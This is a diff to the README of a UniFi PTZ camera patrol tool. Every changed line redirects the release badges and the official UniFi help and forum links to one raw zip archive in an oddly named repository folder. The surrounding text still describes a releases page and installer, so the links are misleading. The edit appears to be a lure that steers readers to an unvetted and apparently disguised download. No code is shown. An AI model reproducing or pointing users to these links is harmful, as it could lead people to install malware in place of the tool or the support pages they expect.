@@ -1,6 +1,6 @@
 # 📷 unifi-ptz-better-patrol - Smarter PTZ Camera Patrol System
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/mattwatery728/unifi-ptz-better-patrol/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip)
 
 ## 📖 What is unifi-ptz-better-patrol?
 
@@ -34,7 +34,7 @@ Below are the steps to download, install, and run unifi-ptz-better-patrol on you
 
 Visit the release page to get the latest version of the software:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/mattwatery728/unifi-ptz-better-patrol/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip)
 
 Click the link above. It takes you to the releases page. Find the latest Windows installer file, usually named something like `unifi-ptz-better-patrol-setup.exe`. Download this file to your PC.
 
@@ -97,13 +97,13 @@ The system runs on your local network, so your video and control stay private.
 ## 🔗 Useful Links
 
 - Download and check for updates:  
-  https://github.com/mattwatery728/unifi-ptz-better-patrol/releases
+  https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip
 
 - UniFi Protect support and info:  
-  https://help.ui.com/hc/en-us/categories/360002041743-UniFi-Protect
+  https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip
 
 - UniFi forums for user help:  
-  https://community.ui.com/categories/unifi-protect
+  https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip
 
 ## 🔒 Privacy
 
@@ -119,4 +119,4 @@ If you have issues or questions, create an issue on GitHub or check the communit
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green)](https://github.com/mattwatery728/unifi-ptz-better-patrol/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green)](https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip)
